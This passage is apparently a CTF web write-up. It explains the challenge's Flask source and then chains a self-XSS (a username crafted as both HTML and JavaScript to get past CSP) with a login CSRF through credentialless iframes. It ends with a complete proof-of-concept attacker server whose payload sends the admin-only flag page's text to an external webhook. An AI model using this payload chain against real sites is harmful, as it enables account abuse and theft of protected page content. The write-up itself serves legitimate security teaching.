class="string">&#x27;admin&#x27;</span>]</span><br><span class="line">        message = <span class="string">&quot;&lt;meta http-equiv=&#x27;refresh&#x27; content=&#x27;0; url=/dashboard&#x27; /&gt;&quot;</span> + <span class="string">f&quot;User <span class="subst">&#123;username&#125;</span> registered successfully.&quot;</span></span><br><span class="line">    <span class="keyword">except</span> sqlite3.IntegrityError:</span><br><span class="line">        message = <span class="string">&quot;&lt;meta http-equiv=&#x27;refresh&#x27; content=&#x27;0; url=/register&#x27; /&gt;&quot;</span> +  <span class="string">f&quot;User <span class="subst">&#123;username&#125;</span> already exists.&quot;</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        db.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> message</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_bot</span>(<span class="params">url</span>):</span><br><span class="line">    options = Options()</span><br><span class="line">    options.add_argument(<span class="string">&#x27;--headless&#x27;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&#x27;--no-sandbox&#x27;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--ignore-certificate-errors&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&#x27;--disable-dev-shm-usage&#x27;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&#x27;--disable-infobars&#x27;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&#x27;--disable-background-networking&#x27;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&#x27;--disable-default-apps&#x27;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&#x27;--disable-extensions&#x27;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&#x27;--disable-gpu&#x27;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&#x27;--disable-sync&#x27;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&#x27;--disable-translate&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    driver = webdriver.Chrome(options=options)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment">## STAGE 1: Registering admin account..</span></span><br><span class="line">        driver.get(<span class="string">&quot;https://127.0.0.1:40111/register&quot;</span>)</span><br><span class="line">        driver.find_element(By.NAME, <span class="string">&quot;username&quot;</span>).send_keys(admin_username)</span><br><span class="line">        driver.find_element(By.NAME, <span class="string">&quot;password&quot;</span>).send_keys(admin_password)</span><br><span class="line">        driver.find_element(By.XPATH, <span class="string">&quot;//button[@type=&#x27;submit&#x27;]&quot;</span>).click()</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment">## STAGE 2: Login as admin..</span></span><br><span class="line">            driver.get(<span class="string">&quot;https://127.0.0.1:40111/login&quot;</span>)</span><br><span class="line">            driver.find_element(By.NAME, <span class="string">&quot;username&quot;</span>).send_keys(admin_username)</span><br><span class="line">            driver.find_element(By.NAME, <span class="string">&quot;password&quot;</span>).send_keys(admin_password)</span><br><span class="line">            driver.find_element(By.XPATH, <span class="string">&quot;//button[@type=&#x27;submit&#x27;]&quot;</span>).click()</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            ...</span><br><span class="line">        <span class="comment">## STAGE 3: Visit the target URL</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Bot is visiting: <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(driver.get_cookies())</span><br><span class="line">        driver.get(url)</span><br><span class="line">        time.sleep(<span class="number">10</span>)</span><br><span class="line">        <span class="built_in">print</span>(driver.get_cookies())</span><br><span class="line">        message = <span class="string">&#x27;done.&#x27;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        message = <span class="string">f&quot;Error occurred: <span class="subst">&#123;e&#125;</span>&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error occurred: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        driver.close()</span><br><span class="line">    <span class="keyword">return</span> message</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/report&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@limiter.limit(<span class="params"><span class="string">&quot;5 per 10 minutes&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">report</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;report.html&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    url = request.form[<span class="string">&#x27;url&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url.startswith(<span class="string">&quot;http://&quot;</span>) <span class="keyword">and</span> <span class="keyword">not</span> url.startswith(<span class="string">&quot;https://&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Only http and https protocol allowed.&quot;</span>, <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    threading.Thread(target=run_bot, args=(url,)).start()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;Report submitted! Our bot will visit url shortly.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init_db</span>():</span><br><span class="line">    <span class="keyword">with</span> app.app_context():</span><br><span class="line">        db = get_db()</span><br><span class="line">        cur = db.cursor()</span><br><span class="line">        cur.execute(</span><br><span class="line">            <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            CREATE TABLE IF NOT EXISTS users (</span></span><br><span class="line"><span class="string">                id INTEGER PRIMARY KEY AUTOINCREMENT,</span></span><br><span class="line"><span class="string">                username TEXT UNIQUE NOT NULL,</span></span><br><span class="line"><span class="string">                password TEXT NOT NULL,</span></span><br><span class="line"><span class="string">                admin BOOLEAN NOT NULL DEFAULT 0</span></span><br><span class="line"><span class="string">            )</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span></span><br><span class="line">        )</span><br><span class="line">        db.commit()</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    init_db()</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">40111</span>, ssl_context=<span class="string">&#x27;adhoc&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>The target is to read the flag in the <strong>&#x2F;flag</strong> endpoint where only admin can visit it.</p>
+<h2 id="Self-XSS"><a href="#Self-XSS" class="headerlink" title="Self XSS"></a>Self XSS</h2><p>There are several clear HTML injection points, both of which appear in the content returned to the user after the authentication process:</p>
+<blockquote>
+<p>Injection point</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="comment"># after login process</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    username = session.get(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;Guest&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> username == <span class="string">&#x27;Guest&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello &quot;</span> + username + <span class="string">&quot;!&quot;</span> + <span class="string">&#x27;&lt;script src=&quot;https://cdn.tailwindcss.com/3.4.17&quot;&gt;&lt;/script&gt;&lt;body class=&quot;min-h-screen flex flex-col items-center gap-4 justify-center bg-gradient-to-br from-slate-900 via-indigo-900 to-sky-900 text-slate-100 text-center font-sans&quot;&gt;&lt;br&gt;Login untuk melihat easter egg.&lt;a href=&quot;/login&quot; class=&quot;px-6 py-3 bg-sky-500 hover:bg-sky-600 text-slate-900 font-semibold rounded-xl shadow-lg transition&quot;&gt;Login&lt;/a&gt;&lt;/body&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello &quot;</span> + username + <span class="string">&quot;!&quot;</span> + <span class="string">&quot;&lt;meta http-equiv=&#x27;refresh&#x27; content=&#x27;0; url=/dashboard&#x27; /&gt;&quot;</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment"># after register process</span></span><br><span class="line">        session[<span class="string">&#x27;user_id&#x27;</span>] = user[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line">        session[<span class="string">&#x27;username&#x27;</span>] = user[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        session[<span class="string">&#x27;admin&#x27;</span>] = user[<span class="string">&#x27;admin&#x27;</span>]</span><br><span class="line">        message = <span class="string">&quot;&lt;meta http-equiv=&#x27;refresh&#x27; content=&#x27;0; url=/dashboard&#x27; /&gt;&quot;</span> + <span class="string">f&quot;User <span class="subst">&#123;username&#125;</span> registered successfully.&quot;</span></span><br><span class="line">    <span class="keyword">except</span> sqlite3.IntegrityError:</span><br><span class="line">        message = <span class="string">&quot;&lt;meta http-equiv=&#x27;refresh&#x27; content=&#x27;0; url=/register&#x27; /&gt;&quot;</span> +  <span class="string">f&quot;User <span class="subst">&#123;username&#125;</span> already exists.&quot;</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        db.close()</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>However, the injection that happens right after registration isn’t very useful, since the page immediately redirects via a meta tag. The one that appears after logging in is much more useful, though, because we can simply comment out the <strong>&lt;meta&gt;</strong> tag using the username below.</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">’/’</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="comment">&lt;!-- </span></span><br></pre></td></tr></table></figure>
+<p>so it will become like this when rendered:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">’/’</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="comment">&lt;!-- !  &lt;meta http-equiv=&#x27;refresh&#x27; content=&#x27;0; url=/dashboard&#x27; /&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>However, because the CSP sets default-src ‘self’, our stored payload has to come from the same origin. To work around that, we can register a user whose username acts as both JavaScript and HTML. The trick is to turn the Hello string into an arrow function, so our username ends up looking like this:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">= async () =&gt; &#123;dosomethinghere&#125;; Hello(); //&lt;script src=’/’&gt;&lt;/script&gt;&lt;!--</span><br></pre></td></tr></table></figure>
+
+<p>Then when it behaves as javascript, it will be processed like this:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Hello</span> = <span class="title function_">async</span> () =&gt; &#123;dosomethinghere&#125;; <span class="title class_">Hello</span>(); <span class="comment">//&lt;script src=’/’&gt;&lt;/script&gt;&lt;!-- !  &lt;meta http-equiv=&#x27;refresh&#x27; content=&#x27;0; url=/dashboard&#x27; /&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>Great now we have XSS… but stil a self-XSS, how do we escalate it so we can compromise the victim?</p>
+<h2 id="CSRF-Attack"><a href="#CSRF-Attack" class="headerlink" title="CSRF Attack"></a>CSRF Attack</h2><p>During the login process, we can see that the application doesn’t enforce CSRF protection. That means we can create a page containing a <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/Security/IFrame_credentialless">credentialles iframe</a>, then trick the user into visiting it so they log in as the attacker with our payload. The iframe won’t use the parent’s cookies, though. So the question is: <em>“How do we actually get the flag?”</em> If we look closely at the CSP configuration:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">app.config[<span class="string">&#x27;SESSION_COOKIE_SAMESITE&#x27;</span>] = <span class="string">&#x27;None&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;SESSION_COOKIE_SECURE&#x27;</span>] = <span class="literal">True</span></span><br></pre></td></tr></table></figure>
+
+<p>The cookie’s SameSite value is set to None, which means it can be sent across different origins. That’s a good sign, because now we can create another iframe that uses the admin’s original cookies. Since both iframes share the same origin, iframe 1 can access properties inside iframe 2. Here’s a visual breakdown of the plan:</p>
+<p><img src="https://hackmd.io/_uploads/ryBlz0MW-x.png" alt="image"></p>
+<p>We can host a web like below:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/cok.html&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &lt;iframe name=&quot;alamak&quot; src=&quot;./csrf.html&quot; width=&quot;40%&quot; height=&quot;500px&quot; credentialless&gt;&lt;/iframe&gt;</span></span><br><span class="line"><span class="string">&lt;iframe name=&quot;kisanak&quot; src=&quot;https://127.0.0.1:40111/flag&quot; width=&quot;40%&quot; height=&quot;500px&quot;&gt;&lt;/iframe&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/csrf.html&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">what</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">  &lt;form action=&quot;https://127.0.0.1:40111/login&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;hidden&quot; name=&quot;username&quot; value=&quot; = async () =&gt; &#123; PAYLOAD_HERE &#125;; Hello();// &lt;script src=&#x27;/&#x27;&gt;&lt;/script&gt;&lt;!--&quot; /&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;hidden&quot; name=&quot;password&quot; value=&quot;calamity&quot; /&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span></span><br><span class="line"><span class="string">  &lt;/form&gt;</span></span><br><span class="line"><span class="string">  &lt;script&gt;</span></span><br><span class="line"><span class="string">    document.forms[0].submit();</span></span><br><span class="line"><span class="string">  &lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hole</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;aku ganteng&quot;</span></span><br><span class="line">    </span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">1338</span>, ssl_context=<span class="string">&#x27;adhoc&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>Yet while attempting for cookie extraction, i realized that the cookies is HTTPOnly</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session=[cookie]; Secure; HttpOnly; Path=/; SameSite=None</span><br></pre></td></tr></table></figure>
+
+<p>Since there’s no endpoint that reflects the cookies in the response, our only option is to extract the flag directly from the page’s body. We can do that easily using <code>window.top[1].document.body.innerText</code>. So here’s my final XSS payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">= async () =&gt; &#123; await new Promise(r =&gt; setTimeout(r,1000)); location.replace(`https://[webhook]?c=$&#123;btoa(window.top[1].document.body.innerText)&#125;`); &#125;; Hello();// &lt;script src=&#x27;/&#x27;&gt;&lt;/script&gt;&lt;!--</span><br></pre></td></tr></table></figure>
+
+<p>Now we can register as a user with that payload and force them to visit our site <strong>&#x2F;cok.html</strong>, and we’ll get our flag in the webhook.</p>
+<hr>
+<h2 id="Exploit-POC"><a href="#Exploit-POC" class="headerlink" title="Exploit POC"></a>Exploit POC</h2><p>automate.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/cok.html&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &lt;iframe name=&quot;alamak&quot; src=&quot;./csrf.html&quot; width=&quot;40%&quot; height=&quot;500px&quot; credentialless&gt;&lt;/iframe&gt;</span></span><br><span class="line"><span class="string">&lt;iframe name=&quot;kisanak&quot; src=&quot;https://127.0.0.1:40111/flag&quot; width=&quot;40%&quot; height=&quot;500px&quot;&gt;&lt;/iframe&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/csrf.html&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">what</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">  &lt;form action=&quot;https://127.0.0.1:40111/login&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;hidden&quot; name=&quot;username&quot; value=&quot; = async () =&gt; &#123; await new Promise(r =&gt; setTimeout(r,1000)); location.replace(`https://[webhook]?c=$&#123;btoa(window.top[1].document.body.innerText)&#125;`); &#125;; Hello();// &lt;script src=&#x27;/&#x27;&gt;&lt;/script&gt;&lt;!--&quot; /&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;hidden&quot; name=&quot;password&quot; value=&quot;calamity&quot; /&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span></span><br><span class="line"><span class="string">  &lt;/form&gt;</span></span><br><span class="line"><span class="string">  &lt;script&gt;</span></span><br><span class="line"><span class="string">    document.forms[0].submit();</span></span><br><span class="line"><span class="string">  &lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hole</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;aku ganteng&quot;</span></span><br><span class="line">    </span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">1338</span>, ssl_context=<span class="string">&#x27;adhoc&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLFormElement/requestSubmit">https://developer.mozilla.org/en-US/docs/Web/API/HTMLFormElement/requestSubmit</a>.</li>
+<li><a target="_blank" rel="noopener" href="https://blog.slonser.info/posts/make-self-xss-great-again/">https://blog.slonser.info/posts/make-self-xss-great-again/</a>.</li>
+</ul>
+<hr>
+
+    </article>
+    <!-- license -->
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2025/12/11/ctf/web/HTBUNIVCTF2024/" title="HTB University CTF 2024">
+                    <div class="nextTitle">HTB University CTF 2024</div>
+                </a>
+        </li>
+        <li class="previous">
+        </li>
+    </ul>
+    <!-- comment -->
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
+            
+            
+            
+            <!-- utteranc评论 -->
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+            
+            
+            
+        </div>
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+    <!-- Mathjax -->
+</main>
+
+                <!-- profile -->
+            </div>
+            <footer class="footer footer-unloaded">
+    <!-- social  -->
+        <div class="social">
+                            <a href="//github.com/DJumanto" class="iconfont-archer github" target="_blank" title="github"></a>
+                <a href="//www.linkedin.com/in/alfafakhrur/" class="iconfont-archer linkedin" target="_blank" title="linkedin"></a>
+                <a href="/DJumanto" class="iconfont-archer discord" target="_blank" title="discord"></a>
+
+        </div>
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    <!-- 不蒜子  -->
+        <div class="busuanzi-container">
+                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+        </div>
+</footer>
+
+        </div>
+        <!-- toc -->
+            <div class="toc-wrapper toc-wrapper-loding" style=    top:50vh;
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#TL-DR"><span class="toc-number">1.</span> <span class="toc-text">TL;DR</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Summary"><span class="toc-number">2.</span> <span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#The-App"><span class="toc-number">3.</span> <span class="toc-text">The App</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Self-XSS"><span class="toc-number">4.</span> <span class="toc-text">Self XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF-Attack"><span class="toc-number">5.</span> <span class="toc-text">CSRF Attack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit-POC"><span class="toc-number">6.</span> <span class="toc-text">Exploit POC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#References"><span class="toc-number">7.</span> <span class="toc-text">References</span></a></li></ol>
+            </div>
+        <!-- sidebar -->
+        <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+        <div class="sidebar-panel-archives">
+    <!-- 在 ejs 中将 archive 按照时间排序 -->
+        
+        
+        
+        
+        
+        
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 6
+        </div>
+        <!-- search  -->
+    </div>
+    <div class="post-archive">
+            <div class="archive-year"> 2025 </div>
+            <ul class="year-list">
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/11</span>
+            <a class="archive-post-title" href="/2025/12/11/ctf/web/CJN2024/">Cyberjawara National 2024 Quals</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/11</span>
+            <a class="archive-post-title" href="/2025/12/11/ctf/web/AMATEURS2025/">Amateurs 2025</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/11</span>
+            <a class="archive-post-title" href="/2025/12/11/ctf/web/HACKTODAY2025/">Hacktoday 2025</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/11</span>
+            <a class="archive-post-title" href="/2025/12/11/ctf/web/NCW2025/">Self-Love NCW 2025</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/11</span>
+            <a class="archive-post-title" href="/2025/12/11/ctf/web/SECURINETS2025/">Securinets 2025</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/11</span>
+            <a class="archive-post-title" href="/2025/12/11/ctf/web/HTBUNIVCTF2024/">HTB University CTF 2024</a>
+        </li>
+            </ul>
+    </div>
+</div>
+
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+            <span class="sidebar-tag-name" data-tags="WEB">
+                <span class="iconfont-archer">&#xe606;</span>
+                WEB
+            </span>
+            <span class="sidebar-tag-name" data-tags="CRLF INJECTION">
+                <span class="iconfont-archer">&#xe606;</span>
+                CRLF INJECTION
+            </span>
+            <span class="sidebar-tag-name" data-tags="XS-LEAKS">
+                <span class="iconfont-archer">&#xe606;</span>
+                XS-LEAKS
+            </span>
+            <span class="sidebar-tag-name" data-tags="RCE">
+                <span class="iconfont-archer">&#xe606;</span>
+                RCE
+            </span>
+            <span class="sidebar-tag-name" data-tags="XSS">
+                <span class="iconfont-archer">&#xe606;</span>
+                XSS
+            </span>
+            <span class="sidebar-tag-name" data-tags="MASS ASSIGNMENT">
+                <span class="iconfont-archer">&#xe606;</span>
+                MASS ASSIGNMENT
+            </span>
+            <span class="sidebar-tag-name" data-tags="XXE">
+                <span class="iconfont-archer">&#xe606;</span>
+                XXE
+            </span>
+            <span class="sidebar-tag-name" data-tags="IDOR">
+                <span class="iconfont-archer">&#xe606;</span>
+                IDOR
+            </span>
+            <span class="sidebar-tag-name" data-tags="BROKEN ACCESS CONTROL">
+                <span class="iconfont-archer">&#xe606;</span>
+                BROKEN ACCESS CONTROL
+            </span>
+            <span class="sidebar-tag-name" data-tags="CLIENT SIDE PATH TRAVERSAL">
+                <span class="iconfont-archer">&#xe606;</span>
+                CLIENT SIDE PATH TRAVERSAL
+            </span>
+            <span class="sidebar-tag-name" data-tags="SQL INJECTION">
+                <span class="iconfont-archer">&#xe606;</span>
+                SQL INJECTION
+            </span>
+            <span class="sidebar-tag-name" data-tags="JWT">
+                <span class="iconfont-archer">&#xe606;</span>
+                JWT
+            </span>
+            <span class="sidebar-tag-name" data-tags="PROTOTYPE POLLUTION">
+                <span class="iconfont-archer">&#xe606;</span>
+                PROTOTYPE POLLUTION
+            </span>
+            <span class="sidebar-tag-name" data-tags="COMMAND INJECTION">
+                <span class="iconfont-archer">&#xe606;</span>
+                COMMAND INJECTION
+            </span>
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    </div>
